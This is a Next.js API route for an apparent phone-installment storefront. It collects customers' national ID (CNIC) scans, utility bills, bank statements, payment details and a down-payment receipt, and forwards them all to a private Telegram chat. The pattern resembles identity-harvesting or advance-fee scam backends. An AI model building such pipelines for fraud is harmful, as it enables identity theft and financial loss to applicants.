import { NextResponse } from 'next/server';

export async function POST(request: Request) {
  try {
    const contentType = request.headers.get('content-type') || '';
    
    let order: any = null;
    let files: { fieldName: string; label: string; file: File }[] = [];

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId || botToken.includes('your_telegram_bot_token')) {
      console.warn('Telegram credentials not configured in environment variables.');
      return NextResponse.json({ 
        success: false, 
        message: 'Telegram credentials missing or not configured in environment' 
      }, { status: 200 });
    }

    if (contentType.includes('multipart/form-data')) {
      const formData = await request.formData();
      const orderJson = formData.get('order') as string;
      if (orderJson) {
        order = JSON.parse(orderJson);
      }

      // Collect all uploaded verification document files and payment receipt
      const possibleFileKeys: { key: string; label: string }[] = [
        { key: 'cnicFront', label: '🪪 CNIC Front Side' },
        { key: 'cnicBack', label: '🪪 CNIC Back Side' },
        { key: 'utilityBill', label: '⚡ Paid Utility Bill' },
        { key: 'balanceProof', label: '🏦 Balance / Statement Proof' },
        { key: 'familyCnic', label: '👨‍👩‍👦 Family Member CNIC' },
        { key: 'paymentProof', label: '💳 Advance / Down Payment Receipt' },
      ];

      for (const item of possibleFileKeys) {
        const f = formData.get(item.key) as File | null;
        if (f && typeof f === 'object' && f.size > 0) {
          files.push({ fieldName: item.key, label: item.label, file: f });
        }
      }
    } else {
      const body = await request.json();
      order = body.order || body;
    }

    if (!order || !order.orderId) {
      return NextResponse.json({ success: false, message: 'No valid order data provided' }, { status: 400 });
    }

    const { 
      orderId, 
      createdAt, 
      model, 
      color, 
      storage, 
      months, 
      monthlyEmi, 
      totalPrice, 
      downPayment,
      balance,
      customer, 
      payment,
      documents
    } = order;

    // 1. Format Rich HTML Telegram Message with full order details
    let messageText = `👑 <b>INSTALMENT MOBILE LIMITED (IML)</b> 👑\n`;
    messageText += `🎉 <b>NEW OFFICIAL INSTALLMENT APPLICATION (#${orderId})</b>\n`;
    messageText += `🕒 <b>Submitted At:</b> ${createdAt || new Date().toLocaleString('en-PK')}\n`;
    messageText += `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;

    messageText += `📱 <b>SELECTED DEVICE & PLAN:</b>\n`;
    messageText += ` ├ 🏷️ <b>Model:</b> ${model?.name || 'iPhone'}\n`;
    messageText += ` ├ 🛡️ <b>Variant:</b> ${model?.variantType || 'PTA Approved'}\n`;
    messageText += ` ├ 🎨 <b>Color:</b> ${color?.name || 'Standard'}\n`;
    messageText += ` ├ 💾 <b>Storage:</b> ${storage?.size || 'Standard'}\n`;
    messageText += ` ├ 💵 <b>Total Price:</b> PKR ${(totalPrice || 0).toLocaleString('en-PK')}\n`;
    messageText += ` ├ 💳 <b>Down Payment:</b> PKR ${(downPayment || 0).toLocaleString('en-PK')}\n`;
    messageText += ` ├ ⚖️ <b>Remaining Balance:</b> PKR ${(balance || 0).toLocaleString('en-PK')}\n`;
    messageText += ` └ 📅 <b>Monthly EMI:</b> ${months || 12} Months @ PKR ${(monthlyEmi || 0).toLocaleString('en-PK')}/mo\n\n`;

    messageText += `👤 <b>CUSTOMER DETAILS:</b>\n`;
    messageText += ` ├ 📛 <b>Full Name:</b> ${customer?.fullName || 'N/A'}\n`;
    messageText += ` ├ 🪪 <b>CNIC:</b> <code>${customer?.cnic || 'N/A'}</code>\n`;
    messageText += ` ├ 📞 <b>Phone Number:</b> <code>${customer?.mobileNumber || 'N/A'}</code>\n`;
    messageText += ` ├ 🏠 <b>Delivery Address:</b> ${customer?.deliveryAddress || 'N/A'}\n`;
    messageText += ` ├ 🚚 <b>Delivery Type:</b> ${customer?.deliveryType === 'open_parcel' ? '🔍 Open Parcel TCS Inspection' : '📦 Insured Sealed'}\n`;
    messageText += ` └ 💳 <b>Channel Choice:</b> ${(payment?.channel || customer?.paymentMethod || 'easypaisa').toUpperCase()}\n\n`;

    messageText += `💳 <b>PAYMENT DETAILS:</b>\n`;
    messageText += ` ├ 🏛️ <b>Channel:</b> ${(payment?.channel || 'easypaisa').toUpperCase()}\n`;
    messageText += ` ├ 🔢 <b>Sender Account:</b> <code>${payment?.senderAccount || 'N/A'}</code>\n`;
    messageText += ` ├ 🔖 <b>Transaction ID:</b> <code>${payment?.transactionId || 'N/A'}</code>\n`;
    messageText += ` └ 📸 <b>Payment Receipt:</b> ${files.some(f => f.fieldName === 'paymentProof') ? 'Attached Below' : (payment?.proofPreviewUrl ? 'Attached' : 'Pending Upload')}\n\n`;

    messageText += `📁 <b>ATTACHED VERIFICATION DOCUMENTS:</b>\n`;
    messageText += ` ├ 🪪 CNIC Front: ${documents?.cnicFrontName || (files.some(f => f.fieldName === 'cnicFront') ? 'Attached' : 'None')}\n`;
    messageText += ` ├ 🪪 CNIC Back: ${documents?.cnicBackName || (files.some(f => f.fieldName === 'cnicBack') ? 'Attached' : 'None')}\n`;
    messageText += ` ├ ⚡ Utility Bill: ${documents?.utilityBillName || (files.some(f => f.fieldName === 'utilityBill') ? 'Attached' : 'None')}\n`;
    messageText += ` ├ 🏦 Statement / Proof: ${documents?.balanceProofName || (files.some(f => f.fieldName === 'balanceProof') ? 'Attached' : 'None')}\n`;
    messageText += ` └ 👨‍👩‍👦 Family CNIC: ${documents?.familyCnicName || (files.some(f => f.fieldName === 'familyCnic') ? 'Attached' : 'N/A')}\n\n`;

    messageText += `━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    messageText += `⏳ <i>Status: Awaiting Verification & Dispatch</i>`;

    // Build compact HTML message for caption (safe within Telegram's 1024-character media caption limit)
    const captionLines = [
      `👑 <b>INSTALMENT MOBILE LIMITED (IML)</b>`,
      `🎉 <b>NEW OFFICIAL APPLICATION (#${orderId})</b>`,
      `🕒 <b>Date:</b> ${createdAt || new Date().toLocaleString('en-PK')}`,
      `━━━━━━━━━━━━━━━━━━━━━━━━━━`,
      `📱 <b>DEVICE & PLAN:</b>`,
      ` ├ 🏷️ <b>Model:</b> ${model?.name || 'iPhone'} (${model?.variantType || 'PTA Approved'})`,
      ` ├ 🎨 <b>Color:</b> ${color?.name || 'Standard'} | 💾 <b>Storage:</b> ${storage?.size || 'Standard'}`,
      ` ├ 💵 <b>Total:</b> PKR ${(totalPrice || 0).toLocaleString('en-PK')} | 💳 <b>Down:</b> PKR ${(downPayment || 0).toLocaleString('en-PK')}`,
      ` └ 📅 <b>EMI:</b> ${months || 12} Mos @ PKR ${(monthlyEmi || 0).toLocaleString('en-PK')}/mo`,
      ``,
      `👤 <b>CUSTOMER DETAILS:</b>`,
      ` ├ 📛 <b>Name:</b> ${customer?.fullName || 'N/A'}`,
      ` ├ 🪪 <b>CNIC:</b> <code>${customer?.cnic || 'N/A'}</code>`,
      ` ├ 📞 <b>Phone:</b> <code>${customer?.mobileNumber || 'N/A'}</code>`,
      ` ├ 🏠 <b>Address:</b> ${customer?.deliveryAddress || 'N/A'}`,
      ` └ 🚚 <b>Delivery:</b> ${customer?.deliveryType === 'open_parcel' ? '🔍 Open Parcel TCS Inspection' : '📦 Insured Sealed'}`,
      ``,
      `💳 <b>PAYMENT DETAILS:</b>`,
      ` ├ 🏛️ <b>Channel:</b> ${(payment?.channel || customer?.paymentMethod || 'easypaisa').toUpperCase()}`,
      ` ├ 🔢 <b>Sender Acc:</b> <code>${payment?.senderAccount || 'N/A'}</code>`,
      ` ├ 🔖 <b>Tx ID:</b> <code>${payment?.transactionId || 'N/A'}</code>`,
      ` └ 📸 <b>Files:</b> ${files.length > 0 ? `${files.length} uploaded in this album` : 'None'}`,
      `━━━━━━━━━━━━━━━━━━━━━━━━━━`,
      `⏳ <i>Status: Awaiting Verification & Dispatch</i>`
    ];

    let fullCaption = captionLines.join('\n');
    // Ensure caption does not exceed Telegram's 1024 char limit
    if (fullCaption.length > 1020) {
      fullCaption = fullCaption.slice(0, 1017) + '...';
    }

    const isImageFile = (f: File) => {
      return (f.type && f.type.startsWith('image/')) || /\.(jpe?g|png|webp|gif|bmp)$/i.test(f.name);
    };

    const imageFiles = files.filter(f => isImageFile(f.file));
    const docFiles = files.filter(f => !isImageFile(f.file));

    let telegramSuccess = false;
    let mainMessageId: number | null = null;
    const mediaResults: any[] = [];

    // SCENARIO 1: We have image files (at least 1). Group all images together!
    if (imageFiles.length >= 2) {
      try {
        const mediaGroupFormData = new FormData();
        mediaGroupFormData.append('chat_id', chatId);

        const mediaGroupArray = imageFiles.slice(0, 10).map((item, index) => {
          const attachKey = `photo_${index}`;
          mediaGroupFormData.append(attachKey, item.file, item.file.name);
          return {
            type: 'photo',
            media: `attach://${attachKey}`,
            caption: index === 0 ? fullCaption : `${item.label} (#${orderId})`,
            parse_mode: 'HTML'
          };
        });

        mediaGroupFormData.append('media', JSON.stringify(mediaGroupArray));

        const groupRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMediaGroup`, {
          method: 'POST',
          body: mediaGroupFormData
        });

        const groupData = await groupRes.json();
        if (groupData.ok) {
          telegramSuccess = true;
          mainMessageId = Array.isArray(groupData.result) ? groupData.result[0]?.message_id : null;
          mediaResults.push({ type: 'mediaGroup', success: true, count: imageFiles.length });
        } else {
          console.warn('sendMediaGroup failed, attempting fallback:', groupData);
          throw new Error(groupData.description || 'sendMediaGroup failed');
        }
      } catch (err: any) {
        console.error('sendMediaGroup error, running fallback:', err);
        // Fallback: Send single text then individual photos
        const fallbackRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: fullCaption, parse_mode: 'HTML' })
        });
        const fallbackData = await fallbackRes.json();
        if (fallbackData.ok) {
          telegramSuccess = true;
          mainMessageId = fallbackData.result.message_id;
        }

        // Send photos individually
        for (const item of imageFiles) {
          const fd = new FormData();
          fd.append('chat_id', chatId);
          if (mainMessageId) fd.append('reply_to_message_id', String(mainMessageId));
          fd.append('caption', `${item.label} for #${orderId}`);
          fd.append('photo', item.file, item.file.name);
          await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
        }
      }
    } else if (imageFiles.length === 1) {
      // Single image: sendPhoto with the full order caption attached
      try {
        const singlePhotoFormData = new FormData();
        singlePhotoFormData.append('chat_id', chatId);
        singlePhotoFormData.append('photo', imageFiles[0].file, imageFiles[0].file.name);
        singlePhotoFormData.append('caption', fullCaption);
        singlePhotoFormData.append('parse_mode', 'HTML');

        const singleRes = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: singlePhotoFormData
        });
        const singleData = await singleRes.json();
        if (singleData.ok) {
          telegramSuccess = true;
          mainMessageId = singleData.result.message_id;
          mediaResults.push({ type: 'singlePhoto', success: true });
        } else {
          throw new Error(singleData.description);
        }
      } catch (err) {
        // Fallback to text message
        const textRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: fullCaption, parse_mode: 'HTML' })
        });
        const textData = await textRes.json();
        telegramSuccess = textData.ok;
      }
    } else {
      // No images uploaded: send text notification
      const textRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: fullCaption, parse_mode: 'HTML' })
      });
      const textData = await textRes.json();
      telegramSuccess = textData.ok;
      if (textData.ok) mainMessageId = textData.result.message_id;
    }

    // SCENARIO 2: Non-image documents (e.g. PDF utility bills / bank statements)
    for (const doc of docFiles) {
      try {
        const docFormData = new FormData();
        docFormData.append('chat_id', chatId);
        if (mainMessageId) docFormData.append('reply_to_message_id', String(mainMessageId));
        docFormData.append('caption', `${doc.label} (#${orderId})`);
        docFormData.append('document', doc.file, doc.file.name);
        await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
          method: 'POST',
          body: docFormData
        });
      } catch (docErr) {
        console.error('Error sending doc to Telegram:', docErr);
      }
    }

    return NextResponse.json({ 
      success: telegramSuccess, 
      mainMessageId, 
      filesReceived: files.length,
      imageCount: imageFiles.length,
      docCount: docFiles.length,
      mediaResults 
    });
  } catch (error: any) {
    console.error('Server Telegram route error:', error);
    return NextResponse.json({ success: false, error: error.message }, { status: 500 });
  }
}
